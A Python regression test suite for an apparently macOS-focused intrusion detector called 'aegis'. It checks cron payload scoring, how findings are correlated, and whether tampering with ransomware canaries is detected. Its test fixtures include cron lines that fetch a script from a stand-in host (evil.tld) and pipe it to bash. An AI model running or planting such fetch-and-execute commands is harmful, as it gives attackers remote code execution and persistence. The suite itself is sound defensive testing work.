#!/usr/bin/env python3
"""Regression suite for the SPAR round-1 hardening pass.

Each test would FAIL against the pre-fix code. Reuses the fully-sandboxed
Sandbox base from test_regression, so this NEVER touches real ~/.aegis, reads
the live host, or fires a notification. Stdlib-only.

Covers:
  F1 cron payload scoring — `crontab -e`-installed fileless persistence
     (T1053.003) was capped at a fixed, entity-less MEDIUM, below the HIGH+
     notify floor, so it could neither alert nor correlate.
  F2 multi-identity joins — a persistence finding is about both the plist that
     changed and the program it launches; only the latter is ever reported by
     another sensor, so keying every join on the plist made the documented
     persistence-execution and path-lineage chains unreachable from real sensor
     output.
  F3 canary arming record — ~/.aegis/canaries.json had no HMAC watermark and no
     deletion detection, so one `rm` (or in-place encryption by the very
     ransomware the tripwire targets) silently disarmed the only CRITICAL
     ransomware tripwire and every later scan reported CLEAN.

Every fix is paired with a false-positive guard: benign crontabs, never-armed
canaries, deliberate re-arming, and shared interpreters must all stay quiet.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))  # sibling import
import aegis  # noqa: E402
from test_regression import Sandbox  # noqa: E402


HOSTILE_CMD = "/bin/bash -c 'curl -fsSL http://evil.tld/p.sh | bash'"
BENIGN_CRONTAB = """\
# nightly cleanup
PATH=/usr/local/bin:/usr/bin:/bin
MAILTO=""
0 3 * * * /usr/bin/find /tmp -type f -mtime +7 -delete
*/15 * * * * /usr/local/bin/backup.sh --quiet
@daily /opt/homebrew/bin/brew update
30 2 * * MON /usr/bin/python3 /Users/me/scripts/report.py
0 * * * * curl -fsS http://localhost:9000/healthz > /dev/null
"""


class CronMixin(object):
    def cron_findings(self, crontab_text):
        """check_cron() with `crontab -l` stubbed; nothing else is stubbed."""
        real_run = aegis.run

        def fake_run(cmd, timeout=15):
            if cmd and cmd[0] == "crontab":
                return (crontab_text, "", 0)
            return real_run(cmd, timeout)

        aegis.run = fake_run
        try:
            return aegis.check_cron()
        finally:
            aegis.run = real_run

    def worst(self, findings):
        return max((aegis.SEV_ORDER[f["severity"]] for f in findings),
                   default=-1)


# --------------------------------------------------------------------------- #
# F1 — cron is a persistence surface, so its payload gets scored
# --------------------------------------------------------------------------- #


class TestCronPayloadScoring(CronMixin, Sandbox):

    def test_hostile_cron_command_is_notify_grade(self):
        fs = self.cron_findings("*/5 * * * * %s\n" % HOSTILE_CMD)
        self.assertGreaterEqual(
            self.worst(fs), aegis.SEV_ORDER["HIGH"],
            "cron-installed `curl … | bash` must reach the HIGH+ notify floor, "
            "as the identical payload does through launchd")

    def test_hostile_cron_command_notifies(self):
        fs = self.cron_findings("*/5 * * * * %s\n" % HOSTILE_CMD)
        self.notifications[:] = []
        aegis.emit(fs, first_run=False)
        self.assertTrue(self.notifications,
                        "a hostile crontab entry must raise a notification")

    def test_hostile_cron_finding_carries_a_join_entity(self):
        fs = self.cron_findings("*/5 * * * * %s\n" % HOSTILE_CMD)
        self.assertTrue(
            [f for f in fs if aegis._entity(f)],
            "an entity-less finding is skipped by _same_entity() and "
            "_accumulate_risk(), so it can never correlate or accumulate")

    def test_script_payload_is_joinable_to_its_drop(self):
        """A cron line running a dropped script joins on the script's path."""
        payload = os.path.join(self.hot, "payload.sh")
        with open(payload, "w") as f:
            f.write("#!/bin/sh\n")
        fs = self.cron_findings(
            "*/5 * * * * /bin/bash %s\n"
            "0 1 * * * /bin/sh -c 'curl -fsSL http://evil.tld/x | sh'\n" % payload)
        drop = aegis.finding("HIGH", "hot-dir", "Drop", "d", "fp-drop",
                             path=payload)
        self.assertTrue(
            [f for f in fs if aegis._same_entity(f, drop)],
            "the cron finding must join the drop it executes")

    # ------------------------------ FP guards ------------------------------ #

    def test_benign_crontab_is_never_high(self):
        fs = self.cron_findings(BENIGN_CRONTAB)
        high = [(f["severity"], f["title"]) for f in fs
                if aegis.SEV_ORDER[f["severity"]] >= aegis.SEV_ORDER["HIGH"]]
        self.assertEqual(high, [], "benign crontab produced HIGH+: %r" % high)

    def test_settings_and_comments_are_not_commands(self):
        for line in ("PATH=/usr/local/bin:/usr/bin", 'MAILTO=""',
                     "# a comment", "", "   "):
            self.assertEqual(aegis._cron_command(line), "",
                             "parsed as an executable command: %r" % line)

    def test_schedule_fields_are_stripped(self):
        self.assertEqual(aegis._cron_command("*/5 * * * * /bin/echo hi"),
                         "/bin/echo hi")
        self.assertEqual(aegis._cron_command("30 2 * * MON /bin/echo hi"),
                         "/bin/echo hi")
        self.assertEqual(aegis._cron_command("@reboot /bin/echo hi"),
                         "/bin/echo hi")

    def test_hostile_line_is_found_among_benign_ones(self):
        fs = self.cron_findings(BENIGN_CRONTAB + "*/5 * * * * %s\n" % HOSTILE_CMD)
        self.assertGreaterEqual(self.worst(fs), aegis.SEV_ORDER["HIGH"])

    def test_unbalanced_quotes_do_not_crash_the_sensor(self):
        self.cron_findings("*/5 * * * * /bin/echo 'unterminated\n")

    def test_plain_healthcheck_fetch_stays_below_the_notify_floor(self):
        """A bare fetch is not a fetch+exec pipeline. Rating every
        `curl http://…` cron line HIGH would fire on ordinary healthchecks."""
        fs = self.cron_findings(
            "0 * * * * curl -fsS http://localhost:9000/healthz > /dev/null\n")
        self.assertLess(self.worst(fs), aegis.SEV_ORDER["HIGH"],
                        "a plain cron healthcheck must not notify")

    def test_interpreter_aimed_at_a_temp_script_is_high(self):
        """Structural tell _argv_signals cannot see, and the reason cron needs
        more than a string scan: `bash /tmp/.x.sh` carries no hostile idiom."""
        payload = os.path.join(self.hot, ".x.sh")
        with open(payload, "w") as f:
            f.write("#!/bin/sh\n")
        fs = self.cron_findings("*/5 * * * * /bin/bash %s\n" % payload)
        self.assertGreaterEqual(self.worst(fs), aegis.SEV_ORDER["HIGH"])


# --------------------------------------------------------------------------- #
# F2 — a persistence finding is about the plist AND the program it launches
# --------------------------------------------------------------------------- #


class TestJoinIdentity(Sandbox):

    def chains(self, prefix):
        return [i for i in aegis.list_incidents()
                if i["correlation_key"].startswith(prefix)]

    def persistence_finding(self, program, plist="/L/com.evil.plist", args=None):
        return aegis.finding(
            "HIGH", "persistence", "New persistence item", "d",
            "fp-pers-%s" % os.path.basename(program), path=plist,
            program=program,
            script_target=aegis._script_target(args, program))

    def test_persistence_joins_the_program_it_launches(self):
        payload = os.path.join(self.hot, "payload")
        pers = self.persistence_finding(payload)
        drop = aegis.finding("HIGH", "hot-dir", "Drop", "d", "fp-drop",
                             path=payload)
        self.assertTrue(aegis._same_entity(pers, drop),
                        "the plist's Program IS the dropped file")

    def test_persistence_plus_execution_opens_a_critical_chain(self):
        payload = os.path.join(self.hot, "payload")
        aegis.record_security_state([
            self.persistence_finding(payload),
            aegis.finding("HIGH", "process", "Suspicious process", "d",
                          "fp-proc", path=payload)])
        chains = self.chains("chain:persistence-execution")
        self.assertTrue(chains, "persistence + execution of the same program "
                                "must chain")
        self.assertEqual(chains[0]["severity"], "CRITICAL")

    def test_drop_then_persistence_opens_a_lineage_chain(self):
        payload = os.path.join(self.hot, "payload")
        aegis.record_security_state([
            aegis.finding("HIGH", "hot-dir", "Drop", "d", "fp-drop",
                          path=payload)])
        aegis.record_security_state([self.persistence_finding(payload)])
        self.assertTrue(self.chains("chain:lineage"),
                        "a dropped object later persisted must chain")

    def test_interpreter_fronted_persistence_joins_its_script(self):
        """`Program=/bin/bash` + `args=[bash, ~/.agent]`: the payload is the
        script, and that is what another sensor will have seen."""
        payload = os.path.join(self.hot, "agent.sh")
        pers = self.persistence_finding(
            "/bin/bash", args=["/bin/bash", payload])
        drop = aegis.finding("HIGH", "hot-dir", "Drop", "d", "fp-drop",
                             path=payload)
        self.assertTrue(aegis._same_entity(pers, drop),
                        "an interpreter-fronted plist must join its script")

    # ------------------------------ FP guards ------------------------------ #

    def test_shared_interpreter_does_not_manufacture_a_chain(self):
        """Half the launchd agents on a normal Mac run a shell. Joining on the
        interpreter would chain any benign shell agent to any unrelated
        suspicious shell process."""
        aegis.record_security_state([
            aegis.finding("MEDIUM", "persistence", "New persistence item", "d",
                          "fp-pers-bash", path="/L/com.vendor.plist",
                          program="/bin/bash"),
            aegis.finding("HIGH", "behavior", "Suspicious process behavior", "d",
                          "fp-beh-bash", program="/bin/bash", pid="4242")])
        got = [i["correlation_key"] for i in
               self.chains("chain:persistence-execution")]
        self.assertEqual(got, [], "false chain on a shared interpreter: %r" % got)

    def test_shared_interpreter_does_not_accumulate_risk(self):
        aegis.record_security_state([
            aegis.finding("MEDIUM", "persistence", "New persistence item", "d",
                          "fp-pers-%d" % i, path="/L/com.v%d.plist" % i,
                          program="/bin/bash") for i in range(3)])
        got = [i["correlation_key"] for i in self.chains("risk:")]
        self.assertEqual(got, [], "false risk pile-up on /bin/bash: %r" % got)

    def test_pid_and_label_are_not_widened_into_join_keys(self):
        """Only absolute paths join beyond the primary entity — a pid is
        recycled and a label is shared by every finding about one product."""
        a = aegis.finding("HIGH", "process", "p", "d", "fp-a",
                          path="/a/one", pid="4242", label="com.x")
        b = aegis.finding("HIGH", "process", "p", "d", "fp-b",
                          path="/b/two", pid="4242", label="com.x")
        self.assertFalse(aegis._same_entity(a, b),
                         "two distinct binaries joined on pid/label")

    def test_entity_contract_is_unchanged(self):
        """_entity() still returns exactly one value, preferring `path` — dedup
        and incident identity must not move."""
        f = aegis.finding("HIGH", "persistence", "p", "d", "fp",
                          path="/L/x.plist", program="/hot/payload")
        self.assertEqual(aegis._entity(f), "/L/x.plist")


# --------------------------------------------------------------------------- #
# F3 — the canary arming record is watermarked like the trust store
# --------------------------------------------------------------------------- #


class TestCanaryArmingState(Sandbox):

    def arm(self):
        path = os.path.join(self.tmp, "canary.txt")
        with open(path, "w") as f:
            f.write("aegis canary: do not modify\n")
        aegis.save_json(aegis.CANARY_STATE, {path: aegis.sha256(path)})
        aegis.save_json(aegis.BASELINE, {"persistence": {}})
        aegis.record_selfstate()
        return path

    def canary_selfprotection(self):
        return [f for f in aegis.check_self_protection()
                if "canaries" in f["fingerprint"]]

    def test_deleting_the_arming_record_is_flagged(self):
        self.arm()
        os.remove(aegis.CANARY_STATE)
        self.assertTrue(self.canary_selfprotection(),
                        "removing the arming record disarms the CRITICAL "
                        "ransomware tripwire and must not be silent")

    def test_encrypting_the_arming_record_is_flagged(self):
        self.arm()
        with open(aegis.CANARY_STATE, "wb") as f:
            f.write(b"\x00LOCKED\xffencrypted-blob")
        self.assertTrue(self.canary_selfprotection(),
                        "load_json() swallows the parse error into {}, so an "
                        "unreadable arming record must be reported here")

    def test_tamper_plus_disarm_is_not_silent(self):
        path = self.arm()
        with open(path, "wb") as f:
            f.write(b"\x00LOCKED")
        os.remove(aegis.CANARY_STATE)
        self.assertTrue(aegis.check_canaries() + aegis.check_self_protection())

    # ------------------------------ FP guards ------------------------------ #

    def test_never_armed_is_silent(self):
        aegis.save_json(aegis.BASELINE, {"persistence": {}})
        aegis.record_selfstate()
        self.assertEqual(aegis.check_canaries(), [])
        self.assertEqual(self.canary_selfprotection(), [],
                         "a machine that never planted a canary must be quiet")

    def test_deliberate_plant_is_silent(self):
        path = os.path.join(self.tmp, "canary.txt")
        with open(path, "w") as f:
            f.write("decoy\n")
        aegis.save_json(aegis.CANARY_STATE, {path: aegis.sha256(path)})
        aegis._record_canary_watermark()
        self.assertEqual(self.canary_selfprotection(), [],
                         "`aegis.py canary` must not look like tampering")

    def test_deliberate_replant_after_a_scan_is_silent(self):
        path = self.arm()
        aegis.save_json(aegis.CANARY_STATE,
                        {path: aegis.sha256(path), "/other": "hash"})
        aegis._record_canary_watermark()
        self.assertEqual(self.canary_selfprotection(), [],
                         "re-running `aegis.py canary` must not look like "
                         "tampering")

    def test_recording_canaries_does_not_rebless_a_tampered_baseline(self):
        """_record_canary_watermark touches only the canary keys."""
        self.arm()
        aegis.save_json(aegis.BASELINE, {"persistence": {"/evil.plist": {}}})
        aegis._record_canary_watermark()
        self.assertTrue(
            [f for f in aegis.check_self_protection()
             if "baseline" in f["fingerprint"]],
            "the baseline tamper must still be reported")


if __name__ == "__main__":
    unittest.main(verbosity=2)
